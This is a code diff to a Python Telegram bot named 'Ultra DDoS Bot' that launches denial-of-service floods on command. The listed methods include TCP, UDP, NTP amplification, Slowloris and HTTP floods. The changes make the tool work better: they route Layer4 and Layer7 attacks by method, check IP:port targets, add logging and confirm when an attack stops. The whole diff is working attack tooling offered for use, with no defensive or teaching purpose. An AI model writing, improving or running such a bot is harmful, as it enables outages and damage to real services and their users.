@@ -83,7 +83,7 @@ def start(message):
     bot.reply_to(message, (
         "🌟 *Ultra DDoS Bot* 🌟\n"
         "🔧 *Commands*:\n"
-        "  `/attack <method> <target> [duration]` - Start attack\n"
+        "  `/attack <method> <target> [duration]` - Start attack (Layer4: IP:port, Layer7: URL)\n"
         "  `/stop` - Stop attack\n"
         "  `/proxies` - Check proxies\n"
         "💡 *Supported Methods*: TCP, UDP, NTP, SLOWLORIS, GET, POST, HTTP2, CFB, FLOOD"
@@ -105,14 +105,17 @@ def attack(message):
         return
 
     try:
-        if "http" in target.lower():
-            attack = Layer7Attack(target, method, proxies, config["default_threads"], duration, referers, user_agents)
-        else:
+        if method.upper() in ["TCP", "UDP", "NTP", "SLOWLORIS"]:
+            if "http" in target.lower():
+                bot.reply_to(message, "❌ *Error*: Layer4 methods (TCP, UDP, NTP, SLOWLORIS) require IP:port, not URL!", parse_mode="Markdown")
+                return
             if ":" not in target:
                 target += ":80"
             host, port = target.split(":")
             socket.gethostbyname(host)
-            attack = Layer4Attack(host + ":" + port, method, proxies, config["default_threads"], duration, referers, user_agents)
+            attack = Layer4Attack(target, method, proxies, config["default_threads"], duration, referers, user_agents)
+        else:
+            attack = Layer7Attack(target, method, proxies, config["default_threads"], duration, referers, user_agents)
 
         msg = bot.reply_to(message, (
             f"✅ *Attack Launched* ✅\n"
@@ -131,21 +134,24 @@ def attack(message):
                 try:
                     bot.edit_message_text(format_status(attack), chat_id=message.chat.id, 
                                         message_id=message_ids[message.chat.id], parse_mode="Markdown")
-                except:
-                    pass
+                except Exception as e:
+                    logger.error(f"Failed to update status: {e}")
                 await asyncio.sleep(1)
             bot.edit_message_text(f"🛑 *Attack Stopped* 🛑\n📊 *Final Report*:\n{format_status(attack)}",
                                 chat_id=message.chat.id, message_id=message_ids[message.chat.id], parse_mode="Markdown")
 
         loop.create_task(update_status())
+        logger.info(f"Attack started: {method} on {target} with {attack.threads} threads")
     except Exception as e:
         bot.reply_to(message, f"❌ *Error*: `{str(e)}`", parse_mode="Markdown")
+        logger.error(f"Attack initialization failed: {e}")
 
 @bot.message_handler(commands=['stop'])
 def stop(message):
     if message.chat.id in attacks:
         attacks[message.chat.id].running = False
         del attacks[message.chat.id]
+        bot.reply_to(message, "🛑 *Attack stopped successfully!*", parse_mode="Markdown")
     else:
         bot.reply_to(message, "⚠️ *No active attack found!*", parse_mode="Markdown")
 
